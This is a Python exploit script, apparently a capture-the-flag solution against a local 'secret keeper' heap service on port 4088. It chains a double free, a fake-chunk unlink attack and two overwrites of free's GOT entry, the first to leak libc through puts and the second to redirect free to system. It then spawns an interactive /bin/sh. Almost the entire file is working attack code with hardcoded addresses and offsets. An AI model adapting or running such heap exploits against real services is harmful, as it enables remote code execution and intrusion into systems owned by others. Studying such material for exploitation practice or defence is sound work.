import socket, struct, telnetlib
import time


def sock(remoteip, remoteport):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((remoteip, remoteport))
    return s, s.makefile('rw', bufsize=0)


def read_until(f, delim='\n'):
    data = ''
    while not data.endswith(delim):
      data += f.read(1)
    return data


def shell(s):
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()


def debug(func):
    def wrapper(*args, **kwargs):
        print '{}({}, {})'.format(func.__name__, str(args), str(kwargs))
        return func(*args, **kwargs)
    return wrapper


@debug
def keep(size_, secret):
    read_until(f, '3. Renew secret\n')
    f.write('1\n')

    read_until(f, 'Big secret\n')
    f.write('{}\n'.format(size_))

    read_until(f, 'secret: \n')
    f.write('{}'.format(secret))


@debug
def wipe(size_):
    read_until(f, '3. Renew secret\n')
    f.write('2\n')

    read_until(f, 'Big secret\n')
    f.write('{}'.format(size_))


@debug
def renew(size_, secret):
    read_until(f, '3. Renew secret\n')
    f.write('3\n')

    read_until(f, 'Big secret\n')
    f.write('{}'.format(size_))

    read_until(f, 'secret: \n')
    f.write('{}'.format(secret))


def p(a): return struct.pack("<I",a)
def u(a): return struct.unpack("<I",a)[0]
def p64(a): return struct.pack("<Q",a)
def u64(a): return struct.unpack("<Q",a)[0]


s, f = sock("127.0.0.1", 4088)


# small
keep(1, 'AAAA')

# big so freed small will not be merged with top
keep(2, 'BBBB')

# link small to fastbin
wipe(1)

# call malloc consolidate by secret huge
# by consolidate, fastbin will be linked to unsorted list
keep(3, 'DDDD')

# double free small
# after this small is both linked to fastbins and unsorted list
wipe(1)

addr_small_p = 0x6020D0
# build fake chunk
buf = ''
buf += p64(0) # prev size
buf += p64(0x20) # size
buf += p64(addr_small_p-8*3)
buf += p64(addr_small_p-8*2)
buf += 'E' * (0x20-len(buf))
buf += p64(0x20) # prev size

keep(1, buf)
print 'previnuse of big should be 0'

print 'carry out unlink attack'
wipe(2)

keep(2, 'FFFF')

buf = ''
buf += p64(0x0)
buf += p64(0x602018) # addr_free_got 

renew(1, buf)

print 'now we can overwrite addr_free_got'
print '*addr_free_got = addr_puts_plt'
renew(2, p64(0x400760))

print 'leak read @ libc'
buf = ''
buf += p64(0xdeadbeaf)
buf += p64(0x602040) # addr_read_got
renew(1, buf)

wipe(2) # call puts(addr_read_got)
addr_libc_read = u64(read_until(f).strip('\n').ljust(8, '\x00'))
addr_libc = addr_libc_read - 0xf7250
addr_system = addr_libc + 0x45390

print 'addr_libc = {}'.format(hex(addr_libc))
print 'addr_system = {}'.format(hex(addr_system))

keep(2, 'HHHH')

buf = ''
buf += p64(0x0)
buf += p64(0x602018) # addr_free_got 
renew(1, buf)

print '*addr_free_got = addr_system'
renew(2, p64(addr_system))

renew(1, '/bin/sh\x00')
# call system by calling free
# cuz got of free is overwritten with system
wipe(1)


shell(s)
